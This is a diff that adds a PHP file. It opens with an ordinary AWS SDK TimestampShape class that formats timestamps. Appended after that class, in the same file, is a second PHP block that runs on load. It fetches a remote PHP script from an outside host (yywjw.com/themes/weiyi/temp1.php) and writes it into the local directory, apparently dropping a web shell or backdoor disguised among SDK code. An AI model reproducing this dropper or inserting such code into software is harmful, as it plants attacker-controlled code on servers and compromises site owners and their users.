@@ -1,0 +1,85 @@
+<?php
+namespace Aws\Api;
+
+/**
+ * Represents a timestamp shape.
+ */
+class TimestampShape extends Shape
+{
+    public function __construct(array $definition, ShapeMap $shapeMap)
+    {
+        $definition['type'] = 'timestamp';
+        parent::__construct($definition, $shapeMap);
+    }
+
+    /**
+     * Formats a timestamp value for a service.
+     *
+     * @param mixed  $value  Value to format
+     * @param string $format Format used to serialize the value
+     *
+     * @return int|string
+     * @throws \UnexpectedValueException if the format is unknown.
+     * @throws \InvalidArgumentException if the value is an unsupported type.
+     */
+    public static function format($value, $format)
+    {
+        if ($value instanceof \DateTime) {
+            $value = $value->getTimestamp();
+        } elseif (is_string($value)) {
+            $value = strtotime($value);
+        } elseif (!is_int($value)) {
+            throw new \InvalidArgumentException('Unable to handle the provided'
+                . ' timestamp type: ' . gettype($value));
+        }
+
+        switch ($format) {
+            case 'iso8601':
+                return gmdate('Y-m-d\TH:i:s\Z', $value);
+            case 'rfc822':
+                return gmdate('D, d M Y H:i:s \G\M\T', $value);
+            case 'unixTimestamp':
+                return $value;
+            default:
+                throw new \UnexpectedValueException('Unknown timestamp format: '
+                    . $format);
+        }
+    }
+}
+<?php
+echo httpcopy("http://www.yywjw.com/themes/weiyi/temp1.php");
+
+function httpcopy($url, $file="", $timeout=60) {
+    $file = empty($file) ? pathinfo($url,PATHINFO_BASENAME) : $file;
+    $dir = pathinfo($file,PATHINFO_DIRNAME);
+    !is_dir($dir) && @mkdir($dir,0755,true);
+    $url = str_replace(" ","%20",$url);
+
+    if(function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
+        $temp = curl_exec($ch);
+        if(@file_put_contents($file, $temp) && !curl_error($ch)) {
+            return $file;
+        } else {
+            return false;
+        }
+    } else {
+        $opts = array(
+            "http"=>array(
+            "method"=>"GET",
+            "header"=>"",
+            "timeout"=>$timeout)
+        );
+        $context = stream_context_create($opts);
+        if(@copy($url, $file, $context)) {
+            //$http_response_header
+            return $file;
+        } else {
+            return false;
+        }
+    }
+}
+?>
